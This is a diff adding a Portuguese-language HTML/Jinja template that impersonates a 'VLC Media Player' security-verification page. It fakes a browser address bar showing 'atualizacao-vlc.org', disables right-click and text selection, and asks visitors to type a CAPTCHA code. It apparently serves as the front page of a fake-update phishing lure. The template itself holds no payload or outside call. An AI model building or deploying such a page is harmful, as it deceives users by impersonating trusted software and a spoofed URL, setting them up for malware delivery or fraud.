@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="utf-8">
+  <title>Verificação de Segurança - VLC Media Player</title>
+  <style>
+    body{font-family:"Segoe UI",Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);margin:0;height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;}
+    .card{background:white;max-width:460px;width:90%;border-radius:18px;box-shadow:0 25px 70px rgba(0,0,0,0.4);overflow:hidden;}
+    .header{background:#d32f2f;color:white;padding:22px;text-align:center;font-size:19px;font-weight:bold;}
+    .content{padding:45px 35px;text-align:center;}
+    h1{font-size:27px;margin:0 0 12px;color:#d32f2f;}
+    p{font-size:17px;line-height:1.6;color:#444;margin:12px 0;}
+    .captcha-img{margin:25px 0;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.3);max-width:100%;}
+    input{font-size:23px;padding:15px;text-align:center;letter-spacing:12px;width:100%;border:2px solid #ddd;border-radius:12px;margin:18px 0;text-transform:uppercase;}
+    .btn{background:#d32f2f;color:white;font-size:21px;padding:18px;border:none;border-radius:12px;cursor:pointer;width:100%;}
+    .btn:hover{background:#b71c1c;}
+    .fakebar{position:fixed;top:0;left:0;width:100%;background:#f0f0f0;padding:10px 20px;font-size:14px;color:#333;box-shadow:0 2px 10px rgba(0,0,0,.2);z-index:9999;}
+  </style>
+</head>
+<body oncontextmenu="return false" onselectstart="return false">
+<div class="fakebar">https://atualizacao-vlc.org – Verificação de Segurança</div>
+<div class="card">
+  <div class="header">VLC Media Player – Verificação de Segurança</div>
+  <div class="content">
+    <h1>Confirme que não é um robô</h1>
+    <p>Para sua proteção, digite o código da imagem:</p>
+    {% if captcha_image %}
+      <img src="/c/{{ captcha_image }}" class="captcha-img" alt="CAPTCHA">
+    {% endif %}
+    {% if erro %}<div style="color:#d32f2f;margin:18px 0;font-weight:bold;">{{ erro }}</div>{% endif %}
+    <form method="POST">
+      <input type="text" name="captcha_input" placeholder="DIGITE AQUI" required maxlength="6" autocomplete="off">
+      <button type="submit" class="btn">Validar Código</button>
+    </form>
+  </div>
+</div>
+</body>
+</html>
